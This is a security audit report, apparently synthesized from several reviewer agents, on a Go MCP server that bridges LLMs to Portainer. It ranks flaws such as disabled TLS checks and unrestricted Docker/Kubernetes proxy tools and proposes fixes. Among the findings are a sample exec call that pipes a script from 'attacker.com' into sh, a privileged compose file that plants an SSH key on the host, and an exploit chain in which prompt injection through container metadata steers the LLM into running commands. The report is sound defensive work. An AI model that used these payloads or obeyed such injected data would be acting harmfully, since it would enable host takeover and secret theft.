# Consolidated Security Review: portainer-mcp

**Date**: 2026-03-01
**Codebase**: portainer-mcp (Go MCP server bridging LLMs to Portainer infrastructure)
**Reviewers**: 4 specialized agents (Sentinel, Architect, MCP Developer, Skeptic)
**Synthesized by**: Lead Developer

---

## Summary

This MCP server acts as a **full-privilege proxy** between an AI assistant and a Portainer infrastructure management platform. Whatever the API token can do, the LLM (and anyone who can influence the LLM via prompt injection) can do. Four independent reviewers examined the codebase and converged on the same critical findings with remarkable consistency, which increases confidence in the results.

The codebase demonstrates solid Go engineering fundamentals -- clean architecture, consistent error handling patterns, good test coverage, and correct MCP protocol usage. However, it has **three critical security gaps** that make it unsuitable for production deployment without remediation: hardcoded TLS bypass, unrestricted Docker/Kubernetes API proxy pass-through, and HTTP response body resource leaks.

**Verdict: NO-GO for production use** until the critical issues below are resolved.

---

## Agent Agreement Matrix

The following table shows which agents independently identified each major finding. High agreement (3-4 agents) indicates high-confidence findings.

| Finding | Sentinel | Architect | MCP Dev | Skeptic | Agreement |
|---------|:--------:|:---------:|:-------:|:-------:|:---------:|
| TLS verification hardcoded off | X | X | X | X | **4/4** |
| Unrestricted Docker/K8s proxy | X | X | X | - | **3/4** |
| Response body never closed | X | X | - | X | **3/4** |
| API token in CLI args | X | - | X | X | **3/4** |
| No compose file validation | X | X | X | - | **3/4** |
| Unbounded io.ReadAll | - | X | X | X | **3/4** |
| updateUserRole privilege escalation | X | X | X | - | **3/4** |
| Env var secrets in stack listings | X | - | X | - | **2/4** |
| Unpinned GitHub Actions | X | - | - | X | **2/4** |
| Contradictory proxy annotations | - | X | X | - | **2/4** |
| Proxy tools registered in read-only | X | X | X | X | **4/4** |
| Prompt injection via raw API responses | - | - | X | - | **1/4** |

---

## CRITICAL (Must Fix Before Any Production Use)

### C1. TLS Certificate Verification Hardcoded to Disabled

**Agents**: All 4/4 agreed
**File**: `internal/mcp/server.go:166`

```go
portainerClient = client.NewPortainerClient(serverURL, token, client.WithSkipTLSVerify(true))
```

The client library defaults to `skipTLSVerify: false` (line 90 of `client.go`) and even documents "Setting this to true is not recommended for production environments" (line 71). Yet the only production call site unconditionally passes `true`. There is no CLI flag to control this. Every API call -- including those carrying the admin API token in `X-API-Key` headers -- is vulnerable to man-in-the-middle interception.

**Exploit scenario**: An attacker on the network path between the MCP server and Portainer intercepts the API token via MITM, then uses it to directly control all Docker/Kubernetes infrastructure managed by Portainer.

**CWE**: CWE-295 (Improper Certificate Validation)

**Fix**: Remove `client.WithSkipTLSVerify(true)` from `server.go:166`. Add a `--skip-tls-verify` CLI flag (default `false`) that users must explicitly enable. Log a warning when it is enabled.

---

### C2. Docker and Kubernetes Proxy Tools Are Unrestricted Pass-Throughs

**Agents**: 3/4 agreed (Sentinel, Architect, MCP Developer)
**Files**:
- `internal/mcp/docker.go:19-95`
- `internal/mcp/kubernetes.go:79-155`

The proxy tools accept arbitrary HTTP methods, arbitrary API paths, arbitrary headers, arbitrary query parameters, and arbitrary request bodies. The only validation is:
- Path must start with `/` (docker.go:44, kubernetes.go:104)
- Method must be in `{GET, POST, PUT, DELETE, HEAD}` (docker.go:32, kubernetes.go:92)
- Read-only mode restricts to GET only (docker.go:36, kubernetes.go:96)

There is **no path allowlist**, **no path blocklist**, and **no restriction on what endpoints can be reached**. Through these tools, an LLM or prompt injection attack can:

1. Execute arbitrary commands inside any container via `POST /containers/{id}/exec`
2. Create privileged containers with host filesystem mounts via `POST /containers/create`
3. Read Kubernetes secrets via `GET /api/v1/namespaces/{ns}/secrets`
4. Delete any container, pod, namespace, or volume
5. Read any container's filesystem via `GET /containers/{id}/archive`

**Exploit scenario (Docker exec chain)**:
```
Step 1: dockerProxy(method=POST, path=/containers/{id}/exec, body={"Cmd":["sh","-c","curl attacker.com/shell.sh|sh"],"AttachStdout":true})
Step 2: dockerProxy(method=POST, path=/exec/{exec-id}/start, body={"Detach":false})
Result: Arbitrary code execution on any Docker container
```

**CWE**: CWE-918 (SSRF), CWE-284 (Improper Access Control)

**Fix**: At minimum, implement a denylist blocking dangerous endpoints (`/exec`, `/containers/create` with privileged params, Kubernetes secrets). Consider requiring explicit user confirmation for non-GET requests. Document prominently that these tools grant full infrastructure-level control.

---

### C3. HTTP Response Body Never Closed in Proxy Handlers (Resource Leak)

**Agents**: 3/4 agreed (Sentinel, Architect, Skeptic)
**Files**:
- `internal/mcp/docker.go:88-93`
- `internal/mcp/kubernetes.go:148-153`

```go
response, err := s.cli.ProxyDockerRequest(opts)
if err != nil {
    return mcp.NewToolResultErrorFromErr("failed to send Docker API request", err), nil
}

responseBody, err := io.ReadAll(response.Body)
// response.Body is NEVER closed
```

The `response.Body` is never closed with `defer response.Body.Close()`. Every Docker or Kubernetes proxy call leaks an HTTP connection. Under sustained use, this will exhaust file descriptors and crash the process.

Note: The `HandleKubernetesProxyStripped` handler correctly delegates to `k8sutil.ProcessRawKubernetesAPIResponse` which DOES close the body (stripper.go:59). The bug is specifically in the two non-stripped proxy handlers.

**CWE**: CWE-404 (Improper Resource Shutdown or Release)

**Fix**: Add `defer response.Body.Close()` after the nil check on the response in both handlers. This is a one-line fix.

---

## HIGH (Should Fix Before Production)

### H1. API Token Exposed in Process Arguments

**Agents**: 3/4 agreed (Sentinel, MCP Developer, Skeptic)
**File**: `cmd/portainer-mcp/mcp.go:27`

```go
tokenFlag := flag.String("token", "", "The authentication token for the Portainer server")
```

The API token is passed as a CLI flag. On Linux/macOS, any user on the system can read process arguments via `ps aux` or `/proc/{pid}/cmdline`. The README shows this pattern in the Claude Desktop config example, normalizing the insecure practice.

**CWE**: CWE-214 (Invocation of Process Using Visible Sensitive Information)

**Fix**: Support reading the token from an environment variable (`PORTAINER_TOKEN`) or a file (`--token-file /path/to/token`). Keep the flag for backward compatibility but document the risks.

---

### H2. Unbounded `io.ReadAll` on Proxied Response Bodies

**Agents**: 3/4 agreed (Architect, MCP Developer, Skeptic)
**Files**:
- `internal/mcp/docker.go:88`
- `internal/mcp/kubernetes.go:148`
- `internal/k8sutil/stripper.go:61`

```go
responseBody, err := io.ReadAll(response.Body)
```

No size limit is applied. A Docker API call returning gigabytes of container logs, or a Kubernetes watch stream with `watch=true`, will cause unbounded memory consumption. The 30-second HTTP client timeout applies to the initial connection, but once a streaming response starts, `io.ReadAll` will read until the server closes the connection.

**CWE**: CWE-770 (Allocation of Resources Without Limits)

**Fix**: Use `io.LimitReader(response.Body, maxBytes)` before `io.ReadAll`. A 10MB limit is a reasonable default. Return a clear error message when the limit is hit.

---

### H3. Unvalidated Compose File Content in Stack Creation/Update

**Agents**: 3/4 agreed (Sentinel, Architect, MCP Developer)
**Files**:
- `internal/mcp/stack.go:57-83`
- `internal/mcp/local_stack.go:93-124`

The `file` parameter (raw docker-compose YAML) is accepted verbatim from the LLM and forwarded to Portainer without any inspection. A malicious or prompt-injected LLM can supply:

```yaml
services:
  pwn:
    image: alpine
    privileged: true
    network_mode: host
    volumes:
      - /:/host
    command: chroot /host sh -c 'echo attacker-key >> /root/.ssh/authorized_keys'
```

**CWE**: CWE-94 (Improper Control of Code Generation)

**Fix**: Parse the compose YAML at the MCP layer and reject payloads containing `privileged: true`, `cap_add: [SYS_ADMIN]`, `network_mode: host`, `pid: host`, or host bind mounts to sensitive paths. This is a policy decision, but the absence of even attempting validation is a structural gap.

---

### H4. Privilege Escalation via `updateUserRole`

**Agents**: 3/4 agreed (Sentinel, Architect, MCP Developer)
**File**: `internal/mcp/user.go:37-62`

The tool accepts any user ID and promotes them to `admin` with a single call. Combined with `listUsers` (which returns all user IDs and roles), this is a two-call privilege escalation path:
1. `listUsers` -> enumerate all users
2. `updateUserRole(id=X, role="admin")` -> promote to admin

There is no confirmation step, no self-modification prevention, and no audit logging at the MCP layer.

**CWE**: CWE-269 (Improper Privilege Management)

**Fix**: Add a confirmation mechanism for privilege escalation. Consider not marking this as `destructiveHint: false` in tools.yaml (line 753). At minimum, document prominently that this tool can grant admin access.

---

### H5. Raw Portainer API Error Bodies Returned to LLM

**Agents**: 3/4 agreed (Sentinel, Architect, Skeptic)
**File**: `pkg/portainer/client/local_stack.go` (lines 53, 86, 133, 172, 200, 222, 246)

```go
bodyBytes, _ := io.ReadAll(resp.Body)
return nil, fmt.Errorf("failed to list local stacks (HTTP %d): %s", resp.StatusCode, string(bodyBytes))
```

Raw Portainer API error bodies (potentially containing stack traces, internal paths, database details) are embedded in error messages returned to the LLM. The error from `io.ReadAll` is also silently discarded.

**CWE**: CWE-209 (Generation of Error Message Containing Sensitive Information)

**Fix**: Log the full error internally and return a sanitized error message to the tool result.

---

### H6. Unpinned GitHub Actions (Supply Chain Risk)

**Agents**: 2/4 agreed (Sentinel, Skeptic)
**Files**:
- `.github/workflows/ci.yml:17-19`
- `.github/workflows/release.yml:22-27`

All GitHub Actions use tag references (`@v4`, `@v2`, `@v1`) instead of SHA-pinned references. Third-party actions from personal accounts (`battila7/get-version-action`, `wangyoucao577/go-release-action`) are particularly risky. Tags can be moved to point to malicious code (as seen in the tj-actions CVE-2025-30066 incident).

Additionally, the release workflow produces only MD5 checksums (a broken hash function), no GPG/Cosign signing, and no SLSA provenance.

**CWE**: CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)

**Fix**: Pin all actions to full commit SHAs. Replace MD5 with SHA256 checksums. Consider adding binary signing.

---

### H7. Environment Variable Secrets Exposed in Stack Listings

**Agents**: 2/4 agreed (Sentinel, MCP Developer)
**Files**:
- `internal/mcp/local_stack.go:28-41`
- `pkg/portainer/models/stack.go:81,116-119`

The `listLocalStacks` tool returns ALL environment variables (names AND values) for every stack. Environment variables commonly contain database passwords, API keys, and connection strings. The `getLocalStackFile` and `getStackFile` tools return raw compose YAML which frequently embeds secrets.

In a prompt injection scenario, these secrets are exfiltrated to the attacker through the LLM's response.

**CWE**: CWE-200 (Exposure of Sensitive Information)

**Fix**: Consider masking environment variable values in list responses (showing names only). Add an opt-in parameter for revealing values. At minimum, document this risk.

---

## MEDIUM (Should Fix This Sprint)

### M1. Proxy Tools Registered in Read-Only Mode (Inconsistent Access Control)

**Agents**: 4/4 agreed
**Files**:
- `internal/mcp/docker.go:15-17`
- `internal/mcp/kubernetes.go:16-20`

Unlike all other feature groups (which use `if !s.readOnly` guards), the Docker and Kubernetes proxy tools are always registered. Write requests are rejected at the handler level, but the tools remain visible to the LLM, which may attempt to use them and receive confusing errors.

**Fix**: Either wrap proxy registration with `if !s.readOnly` or only register the GET-restricted version in read-only mode.

---

### M2. Contradictory Proxy Tool Annotations

**Agents**: 2/4 agreed (Architect, MCP Developer)
**File**: `internal/tooldef/tools.yaml:815-820,880-885`

```yaml
annotations:
  title: Docker Proxy
  readOnlyHint: true      # WRONG - tool supports POST/PUT/DELETE
  destructiveHint: true
  idempotentHint: true     # WRONG - POST creates new resources
  openWorldHint: false
```

Both `dockerProxy` and `kubernetesProxy` are marked `readOnlyHint: true` AND `destructiveHint: true` simultaneously, which is contradictory. The `idempotentHint: true` is also incorrect since POST operations create new resources.

**Fix**: Set `readOnlyHint: false` and `idempotentHint: false` for both proxy tools.

---

### M3. Float64-to-Int Truncation Without Validation

**Agents**: 2/4 agreed (MCP Developer, Skeptic)
**File**: `pkg/toolgen/param.go:62-63`

```go
func (p *ParameterParser) GetInt(name string, required bool) (int, error) {
    num, err := p.GetNumber(name, required)
    if err != nil {
        return 0, err
    }
    return int(num), nil
}
```

JSON numbers arrive as `float64`. The conversion silently truncates fractional parts (`1.5` becomes `1`), does not check for overflow on 32-bit systems, does not reject negative IDs, and does not handle NaN/Infinity.

**Fix**: Validate that the float64 has no fractional part, is within int range, and is non-negative for ID parameters.

---

### M4. No Context/Timeout Propagation to API Calls

**Agents**: 1/4 (Skeptic), but independently verified
**File**: `pkg/portainer/client/local_stack.go:26`

```go
req, err := http.NewRequest(method, url, bodyReader)  // No context
```

Every handler receives a `context.Context` but never passes it to the client. If a Portainer request hangs, the handler blocks indefinitely (up to the 30-second HTTP client timeout for raw client; SDK timeout behavior is unknown).

**Fix**: Use `http.NewRequestWithContext(ctx, ...)` and pass the handler's context through.

---

### M5. `tools.yaml` File Overridable from Filesystem with TOCTOU Race

**Agents**: 2/4 agreed (Architect, Skeptic)
**File**: `internal/tooldef/tooldef.go:13-22`

```go
if _, err := os.Stat(path); os.IsNotExist(err) {
    err = os.WriteFile(path, ToolsFile, 0644)
```

The check-then-write pattern has a TOCTOU race. On shared systems, an attacker could create a symlink between `os.Stat` and `os.WriteFile`, causing the embedded content to overwrite an arbitrary file. The file is also created with `0644` (world-readable).

**Fix**: Use `os.OpenFile` with `O_CREATE|O_EXCL` for atomic creation. Use `0600` permissions.

---

### M6. Broken Minimum Tools Version Check

**Agents**: 1/4 (Skeptic), independently verified
**Files**:
- `internal/mcp/server.go:17`: `MinimumToolsVersion = "1.0"` (no "v" prefix)
- `pkg/toolgen/yaml.go:68`: `semver.Compare(config.Version, minimumVersion)`

The `golang.org/x/mod/semver` package requires versions to start with "v". Since `MinimumToolsVersion = "1.0"` has no "v" prefix, `semver.Compare("v1.2", "1.0")` compares a valid version against an invalid one. Per the semver docs, `Compare` returns 0 when either argument is invalid -- so the minimum version check always passes. ANY valid semver version string passes the check.

**Fix**: Change `MinimumToolsVersion` to `"v1.0"`.

---

### M7. Missing Destructive Annotations on Sensitive Tools

**Agents**: 1/4 (MCP Developer)
**File**: `internal/tooldef/tools.yaml`

Several tools that can cause significant state changes are marked `destructiveHint: false`:
- `stopLocalStack` (line 617): Stopping a running stack disrupts service
- `updateUserRole` (line 753): Privilege escalation capability
- `updateTeamMembers` (line 721): Can remove all members from a team
- `updateAccessGroupUserAccesses` / `updateAccessGroupTeamAccesses`: Can remove all access by passing empty arrays

**Fix**: Mark `stopLocalStack` and `updateUserRole` as `destructiveHint: true`.

---

### M8. No Rate Limiting or Operation Throttling

**Agents**: 2/4 agreed (Sentinel, MCP Developer)
**File**: Absent feature across `internal/mcp/server.go`

No rate limiting, request throttling, or circuit breaker mechanisms exist. An LLM (or attacker via prompt injection) can issue unlimited rapid requests for destructive operations.

**Fix**: Implement request rate limiting per tool category. Consider a confirmation mechanism for destructive operations.

---

## LOW (Nitpicks / Future Improvement)

### L1. Hardcoded Test Credentials

**File**: `tests/integration/containers/portainer.go:27,178`

Hardcoded `adminpassword123` with a bcrypt cost factor of 5 (should be at least 10). Test-only, but sets a poor security example.

### L2. Version Check Leaks Portainer Server Version

**File**: `internal/mcp/server.go:175-176`

The error message on version mismatch reveals the actual Portainer server version to the caller.

### L3. Name Constraints Exist Only in YAML Descriptions, Never Enforced

**Files**: `internal/tooldef/tools.yaml` (createStack, createLocalStack)

The tools.yaml descriptions state naming constraints (lowercase alphanumeric + hyphens/underscores) but no code enforces them.

### L4. TODO in Security-Adjacent Code

**File**: `internal/k8sutil/stripper.go:35`

```go
// TODO: Consider also removing other verbose fields here, e.g., ownerReferences, if needed.
```

Unresolved TODO in the metadata stripping function. Should be resolved with a documented policy decision.

### L5. Mixed Logging Libraries

**Files**: `internal/mcp/server.go:5` (standard `log`), `cmd/portainer-mcp/mcp.go:8` (zerolog)

The `addToolIfExists` function uses `log.Printf` from the standard library while all other logging uses zerolog, causing inconsistent log formatting.

### L6. CI Build Job Has Overly Broad `contents: write` Permission

**File**: `.github/workflows/ci.yml:13-14`

Needed for badge writing, but means any CI compromise could push arbitrary commits.

---

## Top Exploit Chains

### Chain 1: Prompt Injection -> Docker Exec -> Remote Code Execution (CRITICAL)

```
1. Attacker crafts prompt injection in container name/label/env var
2. LLM processes the injected data during a list/inspect operation
3. LLM is tricked into calling dockerProxy:
   - POST /containers/{id}/exec (create exec instance)
   - POST /exec/{exec-id}/start (execute arbitrary commands)
4. Result: Arbitrary code execution on any Docker container
   (If privileged: full host compromise)
```

**Combines**: C2 (unrestricted proxy) + H7 (data returned unsanitized)

### Chain 2: TLS Bypass + Token Theft -> Full Infrastructure Takeover (CRITICAL)

```
1. Attacker reads /proc/{pid}/cmdline to steal API token (H1)
   OR performs MITM to intercept token over unverified TLS (C1)
2. With admin API token, attacker directly calls Portainer API:
   - Creates admin users
   - Deploys malicious stacks across all environments
   - Extracts all secrets
3. Result: Complete infrastructure takeover
```

**Combines**: C1 (TLS disabled) + H1 (token in process args)

### Chain 3: Malicious Compose File -> Host Escape -> Persistent Backdoor (HIGH)

```
1. Attacker (via prompt injection) calls createLocalStack with:
   - file: compose YAML with privileged: true, host mounts, host network
2. Portainer deploys the stack (MCP server performs zero validation)
3. Container has full host access, writes SSH key, establishes persistence
4. Result: Container escape, host compromise, persistent backdoor
```

**Combines**: H3 (no compose validation) + C2 (no restrictions)

---

## Positive Findings (What This Codebase Does Right)

1. **Stdio-only transport**: Eliminates DNS rebinding, CORS, and network MCP transport attacks entirely. This is the correct and secure choice.

2. **Mandatory tool annotations**: Every tool has annotations with safety hints (`readOnlyHint`, `destructiveHint`, `idempotentHint`, `openWorldHint`). The YAML loader enforces their presence.

3. **Read-only mode**: Comprehensively implemented for non-proxy tools. Write tools are not registered when `readOnly` is true. This is a meaningful security boundary.

4. **Enum validation**: Access levels and user roles are validated via allowlists (`isValidAccessLevel`, `isValidUserRole` in `schema.go:92-98`). Not all input is unvalidated.

5. **Clean error handling pattern**: All handlers return `(result, nil)` using `mcp.NewToolResultError()` for tool-level errors, never `(nil, error)` which would cause JSON-RPC protocol errors. This is correct MCP practice.

6. **Model trimming**: Local models expose only necessary fields. The Environment model strips internal URLs and credentials from the Portainer API response.

7. **Good test structure**: Table-driven tests, clear naming, mock interfaces, integration tests with real Portainer containers via testcontainers-go.

8. **Functional options pattern**: The client and server use functional options (`WithSkipTLSVerify`, `WithReadOnly`, etc.), making the API extensible without breaking changes.

9. **Dependencies pinned with go.sum**: All transitive dependencies are locked with cryptographic hashes.

10. **30-second HTTP client timeout**: The raw HTTP client has a timeout configured (`client.go:98`), preventing indefinite hangs for non-streaming requests.

---

## Conflict Resolution

### Sentinel vs Architect on Proxy Tool Design

The Sentinel recommended implementing path allowlists/blocklists for proxy tools. The Architect noted this is a design tension -- the tools are intentionally open-ended by design to provide full API access.

**Resolution**: The Sentinel wins on data paths. While the open design is intentional, the MCP server sits in a unique threat model where the caller is an LLM susceptible to prompt injection. A minimum denylist of the most dangerous endpoints (`/exec`, privileged container creation, Kubernetes secrets) is warranted. Full API access should be possible but gated behind explicit opt-in.

### Skeptic vs Others on Response Body Leak Severity

The Skeptic rated the response body resource leak as CRITICAL. Other agents rated it HIGH or MEDIUM.

**Resolution**: Upgraded to CRITICAL (C3). This is a guaranteed resource leak on every proxy call. Under normal sustained usage, it WILL crash the process. It is trivially fixable (one line) and failure to fix has a deterministic, user-impacting outcome.

### MCP Developer on `stopLocalStack` Annotations

The MCP Developer flagged `stopLocalStack` as missing `destructiveHint: true`. Other agents did not comment.

**Resolution**: Accepted as MEDIUM (M7). Stopping a running production service stack is a destructive action by any reasonable definition. The annotation should be `destructiveHint: true`.

---

## Verdict

### NO-GO

This codebase cannot be deployed to production in its current state. Three critical issues must be resolved first:

1. **C1**: TLS verification hardcoded off -- admin credentials sent over unverified connections
2. **C2**: Unrestricted Docker/Kubernetes proxy -- enables arbitrary code execution via prompt injection
3. **C3**: Response body resource leak -- guaranteed process crash under sustained use

The HIGH-severity issues (H1-H7) should be resolved in the same sprint. The codebase is well-structured and the fixes are tractable -- none require architectural changes.

---

## Priority Fix List (Ordered)

| Priority | ID | Effort | Description |
|:--------:|:--:|:------:|-------------|
| 1 | C3 | 10 min | Add `defer response.Body.Close()` in docker.go and kubernetes.go |
| 2 | C1 | 30 min | Remove hardcoded `WithSkipTLSVerify(true)`, add CLI flag |
| 3 | H1 | 1 hour | Support `PORTAINER_TOKEN` env var and `--token-file` flag |
| 4 | C2 | 2-4 hours | Implement proxy path denylist for dangerous endpoints |
| 5 | H2 | 30 min | Add `io.LimitReader` to all `io.ReadAll` calls on proxy responses |
| 6 | M2 | 10 min | Fix contradictory annotations on proxy tools |
| 7 | M6 | 5 min | Fix `MinimumToolsVersion` to `"v1.0"` |
| 8 | H5 | 1 hour | Sanitize error messages before returning to LLM |
| 9 | H3 | 2-4 hours | Add compose file validation (denylist for privileged, host mounts) |
| 10 | H6 | 30 min | Pin GitHub Actions to SHA hashes |
| 11 | M1 | 30 min | Gate proxy tool registration behind readOnly check |
| 12 | M3 | 30 min | Validate integer parameters (non-negative, no fractional, within range) |
| 13 | H4 | 1 hour | Add confirmation/guard for updateUserRole privilege escalation |
| 14 | M5 | 30 min | Fix TOCTOU race in tooldef.go, use 0600 permissions |
| 15 | M4 | 1 hour | Propagate context to HTTP requests |
| 16 | H7 | 1-2 hours | Mask environment variable values in stack listings |
| 17 | M7 | 10 min | Fix missing destructive annotations |
| 18 | M8 | 2-4 hours | Add rate limiting for tool calls |

**Estimated total remediation**: 2-3 developer-days for all critical and high issues.

Items 1-5 are the minimum required for a re-review. Items 1-3 could be shipped as a hotfix today.
